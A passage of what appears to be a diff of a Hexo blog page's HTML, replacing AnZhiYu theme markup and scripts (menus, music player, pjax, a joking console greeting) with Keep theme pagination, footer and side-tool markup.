class="length-num">26</div></a><a href="/categories/" title="category"><div class="headline">Categories</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">Function</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="Display Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>Display Mode</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/BUU/" style="font-size: 0.88rem;">BUU<sup>10</sup></a><a href="/tags/Canary/" style="font-size: 0.88rem;">Canary<sup>1</sup></a><a href="/tags/NSS/" style="font-size: 0.88rem;">NSS<sup>2</sup></a><a href="/tags/PWN/" style="font-size: 0.88rem;">PWN<sup>12</sup></a><a href="/tags/RC4/" style="font-size: 0.88rem;">RC4<sup>1</sup></a><a href="/tags/RC4%E5%8F%98%E5%BC%8F/" style="font-size: 0.88rem;">RC4变式<sup>1</sup></a><a href="/tags/RE/" style="font-size: 0.88rem;">RE<sup>3</sup></a><a href="/tags/SMC/" style="font-size: 0.88rem;">SMC<sup>1</sup></a><a href="/tags/TEA/" style="font-size: 0.88rem;">TEA<sup>1</sup></a><a href="/tags/WP/" style="font-size: 0.88rem;">WP<sup>4</sup></a><a href="/tags/csu/" style="font-size: 0.88rem;">csu<sup>1</sup></a><a href="/tags/ctfshow/" style="font-size: 0.88rem;">ctfshow<sup>2</sup></a><a href="/tags/gdb/" style="font-size: 0.88rem;">gdb<sup>2</sup></a><a href="/tags/mprotect/" style="font-size: 0.88rem;">mprotect<sup>1</sup></a><a href="/tags/one-gadget/" style="font-size: 0.88rem;">one_gadget<sup>1</sup></a><a href="/tags/orw/" style="font-size: 0.88rem;">orw<sup>1</sup></a><a href="/tags/pwn-study/" style="font-size: 0.88rem;">pwn_study<sup>5</sup></a><a href="/tags/ret2libc2-x64/" style="font-size: 0.88rem;">ret2libc2_x64<sup>1</sup></a><a href="/tags/ret2libc-printf/" style="font-size: 0.88rem;">ret2libc_printf<sup>1</sup></a><a href="/tags/%E5%8A%A8%E8%B0%83/" style="font-size: 0.88rem;">动调<sup>1</sup></a><a href="/tags/%E5%B0%8F%E7%AB%AF%E5%BA%8F/" style="font-size: 0.88rem;">小端序<sup>1</sup></a><a href="/tags/%E6%8E%A8%E6%B5%8B/" style="font-size: 0.88rem;">推测<sup>1</sup></a><a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 0.88rem;">栈溢出<sup>1</sup></a><a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" style="font-size: 0.88rem;">栈迁移<sup>2</sup></a><a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size: 0.88rem;">格式化字符串<sup>2</sup></a><a href="/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/" style="font-size: 0.88rem;">花指令<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button id="go-up" type="button" title="Back To Top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
-var HoldLog = console.log;
-console.log = function () {};
-let now1 = new Date();
-queueMicrotask(() => {
-  const Log = function () {
-    HoldLog.apply(console, arguments);
-  }; //在恢复前输出日志
-  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
-  now1.setTime(now1.getTime() + 250);
-  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
-  const dnum = Math.floor(days);
-  const ascll = [
-    `欢迎使用安知鱼!`,
-    `生活明朗, 万物可爱`,
-    `
+<div class="post-meta-info-container border-box home">
+    <div class="post-meta-info border-box">
         
-       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
-      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
-      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
-      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
-      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
-      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+            <span class="meta-info-item border-box">
+                <i class="icon fa-solid fa-history"></i>&nbsp;<span class="home-post-history"
+                                                                                data-updated="Fri Jul 25 2025 17:21:20 GMT+0800"
+                >2025-07-25 17:21:20</span>
+            </span>
         
-        `,
-    "已上线",
-    dnum,
-    "天",
-    "©2020 By 安知鱼 V1.6.14",
-  ];
-  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
 
-  setTimeout(
-    Log.bind(
-      console,
-      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
-      "color:#425AEF",
-      "",
-      "color:#425AEF",
-      "color:#425AEF",
-      "",
-      "color:#425AEF",
-      ""
-    )
-  );
-  setTimeout(
-    Log.bind(
-      console,
-      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
-      "color:white; background-color:#4fd953",
-      "",
-      "",
-      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
-    )
-  );
+        
 
-  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+        
 
-  setTimeout(
-    console.warn.bind(
-      console,
-      "%c ⚡ Powered by 安知鱼 %c 你正在访问 John Doe 的博客.",
-      "color:white; background-color:#f0ad4e",
-      ""
-    )
-  );
+        
 
-  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+        
+        
+        
+        
+    </div>
 
-  setTimeout(
-    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
-  );
-});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><script>if (typeof gsap === "object") {
-  getScript("/js/anzhiyu/people.js", {defer:true})
-} else {
-  getScript("https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/gsap/gsap.min.js").then(()=>{
-    getScript("/js/anzhiyu/people.js", {defer:true})
-  });
-}</script><input type="hidden" name="page-type" id="page-type" value="anzhiyu"></div><script>var visitorMail = "";
-</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
-var pjax = new Pjax({
-  elements: 'a:not([target="_blank"])',
-  selectors: pjaxSelectors,
-  cacheBust: false,
-  analytics: false,
-  scrollRestoration: false
-})
+    
+        <a class="home-read-more" href="/2025/07/17/Youngter-drive/">Read more&nbsp;<i class="icon fas fa-angle-right"></i></a>
+    
+</div>
 
-document.addEventListener('pjax:send', function () {
-  // removeEventListener scroll 
-  anzhiyu.removeGlobalFnEvent('pjax')
-  anzhiyu.removeGlobalFnEvent('themeChange')
+                </div>
+            </li>
+        
+    </ul>
+    
+    <div class="paginator border-box flex-center">
+        <div class="border-box first-page paginator-btn allowed">
+            <a class="border-box"><i class="fa-solid fa-angle-double-left"></i></a>
+        </div>
 
-  document.getElementById('rightside').classList.remove('rightside-show')
-  
-  if (window.aplayers) {
-    for (let i = 0; i < window.aplayers.length; i++) {
-      if (!window.aplayers[i].options.fixed) {
-        window.aplayers[i].destroy()
-      }
-    }
-  }
+        <div class="border-box paginator-btn allowed">
+            <a class="border-box"
+               href="/"
+            ><i class="fa-solid fa-chevron-left"></i></a>
+        </div>
 
-  typeof typed === 'object' && typed.destroy()
 
-  //reset readmode
-  const $bodyClassList = document.body.classList
-  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
-})
+        <div class="page-number-box border-box flex-center">
+            <input class="page-number-input border-box base-style"
+                   type="number"
+                   value="2"
+                   min="1"
+                   max="3"
+            /><span class="delimiter base-style">/</span><span class="base-style">3</span>
+        </div>
 
-document.addEventListener('pjax:complete', function () {
-  window.refreshFn()
 
-  document.querySelectorAll('script[data-pjax]').forEach(item => {
-    const newScript = document.createElement('script')
-    const content = item.text || item.textContent || item.innerHTML || ""
-    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
-    newScript.appendChild(document.createTextNode(content))
-    item.parentNode.replaceChild(newScript, item)
-  })
+        <div class="border-box paginator-btn allowed">
+            <a class="border-box"
+               href="/page/3/"
+            ><i class="fa-solid fa-chevron-right"></i></a>
+        </div>
 
-  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+        <div class="border-box last-page paginator-btn allowed">
+            <a class="border-box"><i class="fa-solid fa-angle-double-right"></i></a>
+        </div>
+    </div>
 
-  typeof panguInit === 'function' && panguInit()
 
-  // google analytics
-  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
 
-  // baidu analytics
-  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
 
-  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+</div>
 
-  // prismjs
-  typeof Prism === 'object' && Prism.highlightAll()
-})
 
-document.addEventListener('pjax:error', e => {
-  if (e.request.status === 404) {
-    pjax.loadUrl('/404.html')
-  }
-})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Keep Team</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box side-tools-show-handle">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+
+    <!-- tablet toc -->
+    
+</main>
+
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    <!-- home page -->
+    
+        
+<script src="/js/page/home-page.js"></script>
+
+    
+
+    <!-- post page -->
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
